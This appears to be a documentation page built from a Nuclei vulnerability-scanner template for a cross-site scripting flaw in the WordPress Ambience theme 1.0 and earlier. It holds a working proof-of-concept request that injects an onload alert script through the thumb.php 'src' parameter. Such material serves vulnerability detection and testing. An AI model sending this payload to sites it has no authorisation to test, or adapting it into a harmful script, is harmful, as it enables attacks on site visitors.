# Nuclei Template: WordPress Ambience Theme <=1.0 - Cross-Site Scripting
**Template ID:** wp-ambience-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`wp-ambience-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Ambience Theme 1.0 and earlier was affected by a cross-site scripting vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg
```

## References
- https://www.exploit-db.com/expl oits/38568
- https://wpscan.com/vulnerability/c465e5c1-fe43-40e9-894a-97b8ac462381
